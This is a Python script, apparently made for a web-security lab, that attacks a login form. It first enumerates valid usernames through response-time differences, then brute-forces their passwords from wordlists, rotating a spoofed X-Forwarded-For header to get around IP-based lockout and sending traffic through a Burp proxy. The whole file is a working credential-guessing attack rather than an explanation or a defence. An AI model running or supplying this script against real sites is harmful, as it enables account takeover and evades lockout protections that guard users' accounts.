import sys
import requests
import urllib3
import csv
import pandas as pd
import time
# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Update IP as needed to avoid lockout - for larger lists would need to alter more
# Functional but needs optimization
# May want to just run the username enumeration to see response times and adjust time requirements accordingly
def username_enum(url):
    usernames = []
    valid_users = []
    data = pd.read_csv('./burp_users.csv')
    for user in data:
        usernames.append(user)
        #print(user)
        #print(usernames)
    
    i = 2
    for user in usernames:
        t_0 = time.time()
        data = {
            "username": user,
            "password": ";aslkdfja;lsdkfja;sldkfja;lsdkfja;sldkfja;sdlkfja;lsdkfja;sldkfjas;ldkfjas;ldkfja;sldkfja;sldkjfa;lsdkfja;sldkfja;lsdkfja;sldkf"
        }
        header = {
            "x-forwarded-for": f"1.209.3.{i}"
        }
        r = requests.post(url, data = data, verify=False, proxies=proxies, headers=header)
        t_1 = time.time() - t_0
        print(f'[+] {t_1} response time for {user}')
        if t_1 > 0.7:
            valid_users.append(user)
        i += 1

    return valid_users       

def password_enum(valid_users):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)
        #print(passw)
    
    j = 2
    for user in valid_users:
        for password in password_list:
            
            data = {
                "username": user,
                "password": password
            }
            header = {
            "x-forwarded-for": f"1.219.3.{j}"
            }
            r = requests.post(url, data = data, verify=False, proxies=proxies, headers=header)
            j += 1
            
            if 'Invalid username or password.' not in r.text:
                print(f'***** {password} valid for {user} *****')


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('[-] Performing user enumeration')
    valid_usernames = username_enum(url)
    print(valid_usernames)
    print('[-] Performing password enumeration')
    valid_passwords = password_enum(valid_usernames)

